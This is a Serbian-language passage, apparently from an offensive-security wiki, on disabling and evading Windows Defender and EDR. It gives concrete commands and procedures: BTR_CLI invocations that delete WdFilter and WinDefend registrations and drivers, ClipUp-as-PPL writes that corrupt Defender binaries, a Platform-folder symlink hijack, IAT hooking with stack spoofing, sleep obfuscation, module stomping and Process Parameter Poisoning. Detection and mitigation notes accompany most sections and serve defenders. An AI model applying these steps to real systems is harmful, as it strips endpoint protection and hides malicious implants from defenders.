Defender obično zapisuje resource kao fajl nasumičnog imena `[a-z]{8}.sys` i registruje kernel service sa sličnim imenom. `DriverEntry` čita vrednost service-a `Args`, otvara navedeni NTFS ADS, dešifruje i validira action list, zapisuje feedback i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršavanja, tako da se driver unload-uje umesto da ostane resident. Falsifikovani service ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
`:changelist` stream sadrži jedan RC4-encrypted blob. Analizirane builds ponovo koriste fiksni ključ od 256 bajtova, tako da encryption nije authorization boundary. Ispravan plaintext ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i transaction ID izveden iz payload-a), nakon čega slede null-terminated UTF-16 putanja feedback-a i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka proverava se nezavisno pomoću CRC-32 polinoma `0xEDB88320`, sa početnim stanjem `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija izlažu ove kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje fajla, uključujući zaključan fajl |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje fajla u protected path koji je izabrao attacker; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje nedostajućih key path-ova |

Kod akcija 5 i 6, on-wire separator između key-a i value-a jesu **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti ispravno podeljena. Feedback fajl uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje flags, BTR pomera putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow i prozor ranog boot-a

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira kompletan chain: izvlači `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i feedback stream, serializuje/proverava checksum/encrypt-uje povezane akcije, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ga ostavlja kao system-start driver za `-trigger boot`. Direktno registry staging zaobilazi uobičajeni SCM `CreateServiceW` put i zato **ne proizvodi** service-install Event ID 7045. Artifakti pokrenuti pri boot-u mogu se naknadno ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` nije upotrebljiv zato što BTR obavlja file I/O iz `DriverEntry` pre nego što storage stack i `SystemRoot` link budu spremni. `Start=1`, zajedno sa grupom visokog prioriteta `Boot Bus Extender`, izvršava se u Phase 1: NTFS je upotrebljiv, ali se mnogi security driveri koji se pokreću sa sistemom i EDR servisi u user-mode još nisu inicijalizovali. Filteri koji se pokreću pri boot-u, kao što je `WdFilter`, možda su već učitani, ali BTR može ukloniti njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i obrisati izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz zato što se BTR izvršava nakon boot-start evaluacije i poseduje važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hard-coded `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre unload-a. Ovo smanjuje količinu dokaza, dok smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava uklanjanje drivera i oba stream-a zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft vulnerable-driver blocklist ne rešavaju zloupotrebu predviđene BTR funkcionalnosti. Prednost dajte sledećim behavioral korelacijama, uz razlikovanje legitimnog Defender porekla od proizvoljnog launcher-a.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` je univerzalno za BTR staging. `.dat` ADS prikačen na isti `.sys` posebno je sumnjiv zato što legitimni Defender povratne informacije obično smešta u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, bez odgovarajućeg SCM installation event-a.
- **Sysmon 6 -> 23:** Korelišite poznato učitavanje BTR drivera koji nije iz Defender porekla sa naknadnim brisanjem datoteke pripisanim procesu `System`/PID 4, posebno kada su u pitanju security binarne datoteke.
- **Sysmon 11 -> 23:** Upozorite na brzo kreiranje i brisanje `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadzirite dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan za poverenje kada security-tool driver staging pokreće `cmd.exe`, PowerShell ili nepoznat proces.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR pomoću LOLBINs

Protected Process Light (PPL) primenjuje hijerarhiju signer/level tako da samo zaštićeni procesi istog ili višeg nivoa mogu menjati jedni druge. Ofanzivno, ako možete legitimno pokrenuti binary sa omogućenim PPL-om i kontrolisati njegove argumente, možete benignu funkcionalnost (npr. logging) pretvoriti u ograničeni write primitive zasnovan na PPL-u, usmeren na zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava procesu da radi kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) mora biti potpisan EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess uz flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zahtevati kompatibilan protection level koji odgovara signer-u binary-ja (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signere, `PROTECTION_LEVEL_WINDOWS` za Windows signere). Pogrešni nivoi će dovesti do neuspešnog kreiranja.

Pogledajte i širi uvod u PP/PPL i LSASS protection ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher alati
- Open-source helper: CreateProcessAsPPL (bira protection level i prosleđuje argumente ciljnom EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binary `C:\Windows\System32\ClipUp.exe` samostalno pokreće novi proces i prihvata parametar za upis log fajla na putanju koju zada caller.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL privilegije.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite kratke 8.3 putanje za usmeravanje ka lokacijama koje su obično zaštićene.

8.3 pomoćne komande za kratke putanje
- Izlistajte kratka imena: `dir /x` u svakom parent direktorijumu.
- Izvedite kratku putanju u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste prinudili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka 8.3 imena.
3) Ako je ciljni binary obično otvoren/zaključan od strane AV-a tokom rada (npr. MsMpEng.exe), zakažite upis pri boot-u, pre nego što se AV pokrene, instaliranjem auto-start service-a koji se pouzdano izvršava ranije. Potvrdite redosled pokretanja pri boot-u pomoću Process Monitor-a (boot logging).
4) Nakon reboot-a, upis podržan PPL-om izvršava se pre nego što AV zaključa svoje binary-je, čime se ciljni fajl oštećuje i sprečava pokretanje.

Primer invocation-a (putanje su uklonjene/skraćene radi bezbednosti):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, već samo mesto upisa; primitive je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Zahteva lokalni admin/SYSTEM za instaliranje/pokretanje service-a i period predviđen za reboot.
- Tajming je kritičan: cilj ne sme biti otvoren; izvršavanje tokom boot-a izbegava file lock-ove.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada je parent proces nestandardni launcher, u vreme boot-a.
- Novi service-i konfigurisani za auto-start sumnjivih binarnih fajlova koji se dosledno pokreću pre Defender/AV-a. Ispitajte kreiranje/izmenu service-a pre neuspeha pokretanja Defender-a.
- File integrity monitoring Defender binarnih fajlova/Platform direktorijuma; neočekivano kreiranje/izmena fajlova od strane procesa sa protected-process flag-ovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane non-AV binarnih fajlova.

Mitigacije
- WDAC/Code Integrity: ograničite koji signed binarni fajlovi mogu da se pokreću kao PPL i pod kojim parent procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Service hygiene: ograničite kreiranje/izmenu auto-start service-a i nadzirite manipulisanje redosledom pokretanja.
- Uverite se da su Defender tamper protection i early-launch protections omogućeni; ispitajte startup greške koje ukazuju na korupciju binarnih fajlova.
- Razmotrite onemogućavanje generisanja 8.3 short-name naziva na volume-ima koji hostuju security tooling, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Manipulisanje Microsoft Defender-om putem Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se pokreće enumerisanjem podfoldera u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfolder sa najvišim leksikografskim version string-om (npr. `4.18.25070.5-0`), a zatim odatle pokreće Defender service procese (uz ažuriranje service/registry putanja). Ovaj izbor veruje directory entry-jima, uključujući directory reparse points (symlink-ove). Administrator može to da iskoristi za preusmeravanje Defender-a na putanju u koju attacker može da upisuje i postizanje DLL sideloading-a ili ometanja service-a.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlink-ova u Platform folderu)
- Mogućnost reboot-a ili pokretanja ponovnog izbora Defender platforme (restart service-a pri boot-u)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene foldere, ali njegov izbor platforme veruje directory entry-jima i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/trusted putanju.

Korak po korak (primer)
1) Pripremite writable klon trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da posmatrate novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili kod u Defender procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i kako Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava privilege escalation; zahteva administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz PIC kod kojim upravlja napadač. Ovo proširuje evasion izvan malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA) i pruža istu zaštitu za BOFs i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Stage-ujte PIC blob uz ciljni modul koristeći reflective loader (prepending ili companion). PIC mora biti samostalan i position-independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion pre tail-call-a ka adresi stvarnog API-ja. Tipični evasion-i uključuju:
- Maskiranje/demaskiranje memorije oko poziva (npr. šifrovanje Beacon regiona, RWX→RX, menjanje naziva/dozvola stranica), a zatim vraćanje nakon poziva.
- Call-stack spoofing: konstruisanje bezopasnog stack-a i prelazak u ciljni API tako da se pri analizi call stack-a dobiju očekivani frame-ovi.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, eksportujte interfejs kako bi Aggressor script (ili ekvivalent) mogao da registruje API-je koje treba hook-ovati za Beacon, BOFs i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki kod koji koristi hook-ovani import, bez izmene koda alata ili oslanjanja na Beacon da prosleđuje određene API-je.
- Pokriva post-ex DLL-ove: hook-ovanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za pokretanje procesa protiv detekcija zasnovanih na call stack-u, obmotavanjem CreateProcessA/W.

Minimalni nacrt IAT hook-a (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loaders kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitanog modula.
- Wrapper-i treba da budu mali i PIC-safe; razreši stvarni API preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje stranica koje su istovremeno writable+executable.

Call-stack spoofing stub
- Draugr-style PIC stub-ovi prave lažni call chain (return addresses unutar benignih modula), a zatim prelaze u stvarni API.
- Ovo zaobilazi detekcije koje očekuju canonical stacks od Beacon/BOFs do osetljivih API-ja.
- Kombinuj sa stack cutting/stack stitching tehnikama kako bi se izvršavanje smestilo unutar očekivanih frame-ova pre API prologa.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali kada se DLL učita.
- Koristi Aggressor script za registraciju ciljanih API-ja, tako da Beacon i BOFs transparentno koriste isti evasion path bez izmena koda.

Razmatranja za detekciju/DFIR
- IAT integritet: entries koji se razrešavaju u non-image (heap/anon) adrese; periodična verifikacija import pointers.
- Anomalije stack-a: return addresses koje ne pripadaju učitanim images; nagli prelazi na non-image PIC; nedosledno RtlUserThreadStart poreklo.
- Loader telemetry: writes unutar procesa ka IAT-u, rana DllMain aktivnost koja menja import thunks, neočekivane RX regions kreirane pri učitavanju.
- Image-load evasion: ako se hook-uje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assemblies povezana sa memory masking događajima.

Povezani building blocks i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš hook-ovati importe **tokom** `ProcessImports()` tako što zameniš loader-ov `GetProcAddress` pointer prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (persistent PIC object) koji preživljava nakon što se transient loader PIC oslobodi.
- Export-uj funkciju `setup_hooks()` koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress`, preskoči ordinal imports i koristi hash-based hook lookup kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv stvarnom `GetProcAddress`.
- Registruj hook targets tokom linkovanja pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan jer se nalazi unutar rezidentnog PICO-a.

Ovim se dobija **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable imports kada target koristi PEB-walking

Import-time hooks se aktiviraju samo ako se funkcija stvarno nalazi u IAT-u targeta. Ako modul razrešava API-je putem PEB-walk + hash (bez import entry-ja), forsiraj stvarni import kako bi loader-ov `ProcessImports()` path mogao da ga vidi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Compiler emituje IAT entry, čime se omogućava interception kada reflective loader razrešava importe.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obavij poziv Ekko-style obfuscation chain-om koji enkriptuje image u memoriji tokom idle perioda:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` za zakazivanje niza callback-ova koji pozivaju `NtContinue` sa kreiranim `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapped image-om → izvrši blocking wait → RC4 decrypt → **obnovi per-section permissions** prolaskom kroz PE sections → signalizuj završetak.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: vraćaj „success“ za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi caller nastavio izvršavanje dok je image maskiran. Ovaj pattern skriva modul od scanner-a tokom idle prozora i izbegava klasični signature „patched `Sleep()`“.

Ideje za detekciju (zasnovane na telemetry-ju)
- Burst-ovi `CreateTimerQueueTimer` callback-ova koji pokazuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim, kontinualnim buffer-ima veličine image-a.
- `VirtualProtect` nad velikim range-om, praćen custom per-section permission restoration-om.

### Runtime CFG registration za sleep-obfuscation gadgets

Na CFG-enabled targets, prvi indirect jump u mid-function gadget kao što su `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metadata modula. Da bi Ekko/Kraken-style chains nastavili da rade unutar hardened processes:<sup>[[30]](#references)</sup>

- Registruj svaku indirect destination koju chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za adrese unutar loaded images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora početi na **image base-u** i obuhvatiti **punu veličinu image-a**.
- Za manually mapped/PIC/stomped regions, umesto toga koristi **allocation base** i allocation size.
- Označi ne samo dispatch gadget već i exports do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve attacker-controlled executable sections koje će postati indirect targets.

Ovim se ROP/JOP-style sleep chains pretvaraju iz primitive koja „radi samo u non-CFG processes“ u reusable primitive za `explorer.exe`, browsers, `svchost.exe` i druge endpoints kompajlovane sa `/guard:cf`.

### CET-safe stack spoofing za sleeping threads

Potpuna `CONTEXT` replacement je upadljiva i može prestati da radi na CET Shadow Stack sistemima, jer spoofed `Rip` i dalje mora da se slaže sa hardware shadow stack-om. Bezbedniji sleep-masking pattern je:<sup>[[30]](#references)</sup>

- Izaberi drugu thread u istom procesu i pročitaj njene `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Napravi backup stvarnog TEB/TIB-a trenutne thread.
- Capturuj stvarni sleeping context pomoću `GetThreadContext`.
- Kopiraj **samo stvarni `Rip`** u spoof context, ostavljajući spoofed `Rsp`/stack state nepromenjenim.
- Tokom sleep prozora, kopiraj spoof thread-ov `NT_TIB` u trenutni TEB kako bi stack walkers izvršili unwind unutar legitimnog stack range-a.
- Nakon završetka wait-a, obnovi originalni TIB i thread context.

Ovo čuva CET-consistent instruction pointer, dok obmanjuje EDR stack walkers koji veruju TEB stack metadata-ju pri validaciji unwind-ova.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv po signature-u, ista sleep-encrypt-spoof-restore sekvenca može se izvršiti iz suspended helper thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreiraj helper thread sa `NtTestAlert` kao entrypoint-om.
- Queue-uj pripremljene `CONTEXT` frame-ove/APC-je pomoću `NtQueueApcThread` i prazni ih pomoću `NtAlertResumeThread`.
- Čuvaj chain state na heap-u umesto na helper stack-u kako bi izbegao iscrpljivanje podrazumevanog thread stack-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` za atomsko signalizovanje start event-a i blokiranje.
- Suspenduj main thread pre obnavljanja TIB-a/context-a (`NtSuspendThread` → restore → `NtResumeThread`) da bi se smanjio race window tokom kojeg bi scanner mogao da uhvati napola obnovljen stack.

Ovim se `CreateTimerQueueTimer` + `NtContinue` signature zamenjuje helper-thread/APC signature-om, uz zadržavanje istih ciljeva RC4 masking-a i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep-ova, wait-ova ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u stack bounds trenutnog thread-ovog TEB/TIB-a.
- `NtQueueApcThread`/`NtAlertResumeThread` chains koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helper-a za section-permission restoration.
- Ponovljena upotreba kratkih gadget signatures kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivots unutar signed modules.


## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` section-a DLL-a koji je već mapiran unutar target process-a**, umesto alociranja očigledne private executable memory ili učitavanja novog sacrificial DLL-a. Target za overwrite treba da bude **loaded, disk-backed image** čiji code space može da primi payload bez korumpiranja code paths koje proces i dalje koristi.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor targeta

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` je nepouzdan: DLL možda nije učitan u remote process-u, a premali code region će srušiti proces. Pouzdaniji workflow je:

1. Enumeriši target process modules i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo build-uj payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj candidate DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable section-a **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi exported function RVA kao stomp start offset.
5. Izračunaj **blast radius**: ako payload prelazi granicu izabrane funkcije, prepisivaće susedne exports raspoređene nakon nje u memoriji.

Tipični recon/selection helpers koji se viđaju u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljeni proces kako biste izbegli telemetriju funkcije `LoadLibrary`/neočekivanih učitavanja image-a.
- Dajte prednost exportima koji se ciljnom aplikacijom retko izvršavaju; u suprotnom, normalni tokovi koda mogu naići na izmenjene bajtove pre ili nakon kreiranja threada.
- Veliki implant-i često zahtevaju promenu načina ugrađivanja shellcode-a sa string literala na **byte-array/braced initializer**, kako bi ceo bafer bio pravilno predstavljen u injector source-u.

Ideje za detekciju
- Udaljeni upisi u **image-backed izvršne stranice** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto uobičajenijih privatnih RWX/RX alokacija.
- Export entry points čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili context pivots koji počinju izvršavanje unutar legitimnog DLL exporta čiji su prvi bajtovi nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja izbegava klasični remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti target, ona zloupotrebljava činjenicu da Windows **kopira odabrane `CreateProcessW` startup parametre u child process** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers koje `CreateProcessW` kopira

Korisni carriers su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja carriers:

- `lpCommandLine` mora pokazivati na **writable memory** za `CreateProcessW`, a ograničen je na **32,767 Unicode karaktera**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block uzastopnih `NAME=VALUE\0` stringova, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba tretirati kao implementation detail, a ne kao stabilan dokumentovani contract.

Ovim se normalno kreiranje procesa pretvara u **payload-transfer primitive**. Operator kreira child process sa startup podacima pod kontrolom napadača i prepušta Windows-u da izvrši kopiranje između procesa.

### Remote lookup flow bez remote write API-ja

Nakon kreiranja child-a, kopirani bafer se pronalazi pomoću **read-only** primitiva:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobijanje `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Čitanje remote `PEB`-a
3. Praćenje `PEB.ProcessParameters`
4. Čitanje `RTL_USER_PROCESS_PARAMETERS`
5. Korišćenje izabranog pointera:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalni flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršan. Uobičajeni P3 chain je:

1. Kreirati proces normalno (ne suspendovan)
